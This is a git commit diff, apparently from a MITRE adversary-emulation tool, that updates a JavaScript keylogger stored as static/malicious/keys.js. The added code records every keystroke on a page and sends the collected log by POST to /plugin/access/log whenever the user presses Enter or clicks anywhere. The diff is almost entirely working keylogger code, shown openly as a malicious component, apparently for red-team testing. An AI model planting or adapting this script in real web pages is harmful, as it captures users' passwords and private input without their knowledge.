aca4b2c51254863ed91fbd60d7c975c725eb2b65
Hunt, David <davidhunt@mitre.org>
2020-02-05 06:30:38 -0700

    updating usb conf files + the JS keylogger

--- static/malicious/keys.js
+++ static/malicious/keys.js
@@ -1,16 +1,23 @@
 let log = '';
+
+window.addEventListener("click", () => {
+    sendLog();
+});
 document.addEventListener('keydown', event => {
-    console.log(event.key);
     if(event.which === 13 || event.keyCode === 13) {
-        $.ajax({
-           url: '/plugin/access/log',
-           type: 'POST',
-           contentType: 'application/json',
-           data: JSON.stringify({'log': log}),
-           success: function(data, status, options) {
-               log = '';
-           },
-        });
+        sendLog();
     }
     log = log.concat(event.key);
 });
+
+function sendLog(){
+    $.ajax({
+       url: '/plugin/access/log',
+       type: 'POST',
+       contentType: 'application/json',
+       data: JSON.stringify({'log': log}),
+       success: function(data, status, options) {
+           log = '';
+       },
+    });
+}
